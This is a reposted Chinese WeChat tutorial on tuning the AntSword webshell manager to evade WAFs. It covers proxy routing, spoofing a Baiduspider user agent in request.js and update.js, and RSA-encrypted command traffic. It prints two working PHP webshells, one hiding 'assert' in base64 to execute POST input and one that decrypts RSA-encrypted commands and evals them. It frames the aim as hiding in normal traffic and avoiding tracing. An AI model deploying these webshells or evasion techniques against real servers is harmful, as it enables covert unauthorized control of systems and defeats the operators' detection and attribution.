> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/MsEInxcNz1MO22GOuEFk5A)

**#**黑客教程**统统可白嫖#**

![图片](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSHyfzIicIMsib97kZfZEART3awLIBLCUTufSibfC1DXZotKfSvNs2Zr0MSUr7dEWIwsQiay1jwn5WXaOA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

**黑客入门很难？不知道怎么学？**![图片](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSEEQwsVFyfJD70E9HmDELbPwumVMkXxnmgmwHklA5JxIWJlzcPao47a9cibAmp1zeZ5Hf8yEWZSFBg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

**扫码领：全套视频、练手靶场、工具等学习大包**

  

  

随着WAF产品从

  

**前言**
------

  

---

针对于蚁剑的特征，对于流量传输中WAF检测的绕过， 打造武器库， 进行合理化的修改，例如请求头的伪造，流量的加密等一些常用功能，这边主要进行 这几部分的修改。
-------------------------------------------------------------------------------

  

关联阅读：[常见的WebShell管理工具（下载安装及使用）](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247499826&idx=1&sn=22e29f35965a27726f0d737be0b82337&chksm=ebea891fdc9d000982fda5e3d7523dca9becf29957df63c48f6703dc7943836d2da8a12549d0&token=1753699997&lang=zh_CN&scene=21#wechat_redirect)  

  

**修改位置**
--------

  

蚁剑代理通道

  

UA特征伪造

  

RSA流量加密

  

**具体操作**
--------

1.蚁剑代理通道
--------

蚁剑代理通道设置（前提是必须有这个代理）：
---------------------

![图片](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSHhNEsYnw482IXMoqudRWkmO2sY1icH64rKTKibzK7zia4zP8vHoERxap4tL9F2aciaE6ic3jZXoAuMnUw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

2.UA特征伪造

  

蚁剑默认UA抓包：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

主要修改的位置：

```
/modules/request.js
```

这边主要是推荐百度UA，具体自己可以百度下其他UA，都可以根据需要来进行设置：

```
Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
```

原来的UA：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

UA修改后（百度UA爬虫）：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
/modules/update.js
```

同样的方法，将UA头修改为百度爬虫：

修改前：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

修改后UA头：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

通过以上修改后，抓包查看：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

###   

### 3.RSA流量加密

  

蚁剑从2.1开始支持了RSA加密算法，但是仅仅支持php。

  
在我们隐藏流量中无非就是采用对称密钥加密和非对称密钥加密。

  

```
<?php $k=base64_decode('YXNzZXJ0'); $k($_POST['cmd']); ?>
```

注意这里YXNzZxJ0 base64解密为assert，eval不可以。因为eval属于语言构造器，在php中不能来回调，类似call_user_function()。

  

其中数据请求包中存在eval关键字，还是容易被waf检测到，所以UA头一定要记得修改。

  

采用RSA加密

新建一个rsa编码器

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
<?php  
$cmd = @$_POST['ant'];  
$pk = <<<EOF  
-----BEGIN PUBLIC KEY-----  
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCjQSEjYvGaB7q7G5bjKs2b+v34  
XZ5/XhHDScxpv88C+fDv6IwxErr0kwcOp+an21tTtRF7Wl4MbEksL6wE3PNPt39k  
8i4PBfg51IjBYOmer8AHqr9qyDZq5XgK65yOCWsOIN8+fuP7DtvRxfTFoBNK6O3N  
eAKyYF0SRzIqPz8CvwIDAQAB  
-----END PUBLIC KEY-----  
EOF;  
$cmds = explode("|", $cmd);  
$pk = openssl_pkey_get_public($pk);  
$cmd = '';  
foreach ($cmds as $value) {  
  if (openssl_public_decrypt(base64_decode($value), $de, $pk)) {  
    $cmd .= $de;  
  }  
}  
eval($cmd);
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

---

**总结**
------

  

---

细节绝对成败，针对于WAF和内网流量设备的检测，使用加密流量去混淆在正常流量中，使用代理模式，防止间接性溯源。
-------------------------------------------------------

  

转自：**Adminxe's Blog** 

原文地址：https://www.adminxe.com/1563.html

  

声明：本公众号所分享内容仅用于网安爱好者之间的技术讨论，禁止用于违法途径，**所有渗透都需获取授权**！否则需自行承担，本公众号及原作者不承担相应的后果.

  

@

**欢迎关注视频号：“****掌控安全课堂****”**

**分享点那些黑客你不知道的事，每周二也会开直播唠唠嗑！**

**解决大家在自学上存在的烦恼！**

 ![](http://wx.qlogo.cn/finderhead/Q3auHgzwzM5GasbBjHczHC7IgL2AAuVMBjlg8WPebhsOVribyZXibibTQ/0) **掌控安全课堂** ， 脚本小子算黑客吗？2秒钟教你学会使用工具！#网络安全 #黑客 #程序员日常 #程序员 #编程  视频号

[

爬取免费代理，拥有自己的代理池

2021-10-22

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247538507&idx=1&sn=012e95638679390d727ad9ac76f8093a&chksm=ebea1e66dc9d977076c87f955d303509c6a5dee9f498e18669ed25463d9403d7bd7fa2935277&scene=21#wechat_redirect)

[

Burpsuite在各场景下的抓包方法(整理)

2021-08-11

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247530928&idx=1&sn=46ce72097822348cd6d17e2941e60db6&chksm=ebea309ddc9db98bece713fa8eec5b2c9f47cdfb5921c976319c555d627dcd3ec2dc1dee58b6&scene=21#wechat_redirect)

[

【精选】SRC快速入门+上分小秘籍+实战指南

2021-07-26

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247528604&idx=1&sn=5ab3a5b3eaf0c56fcdeabccadfdc6bde&chksm=ebea39b1dc9db0a71fa71d233709afdfd2e2e0483ded28cca42044eded300f1c7025bde1b37a&scene=21#wechat_redirect)

[

干货｜列了几种均能过安全狗的方法！

2021-07-01

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247524943&idx=1&sn=98644144a3c10bb068ec0f310dcc4958&chksm=ebea2b62dc9da2749321fce7ab28788ced08a2b496e0a45b06a5887b5aa457e48f7a66110301&scene=21#wechat_redirect)

[

巧用FOFA挖到你的第一个漏洞

2021-06-08

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247521952&idx=1&sn=55ab0613e5a7ba79b78849b4d91451f6&chksm=ebeadf8ddc9d569bcc64e99414dcbe6878a0b2c9f5c057b30c4bbe465ba76fcaa64e66caa0c2&scene=21#wechat_redirect)

[

一名大学生的黑客成长史到入狱的自述

2020-12-22

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247502926&idx=1&sn=8750295399cdcc5e71918c30bb1a974f&chksm=ebea8563dc9d0c75cdf709d2d16fdbdf82abee64516f7a44347f40056969d1b4bc3a1eb2ab2e&scene=21#wechat_redirect)

[

那些年的Hvv日记

2021-04-17

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247515246&idx=1&sn=b1a73a93f8ce9a5d51ce3bed4ada1e56&chksm=ebeaf543dc9d7c557c36881cccaaffad5312938ad0450dc1e4050de583523c2a27ba5ab3a469&scene=21#wechat_redirect)

  

**看到这里了，点个“赞”、“再看”吧**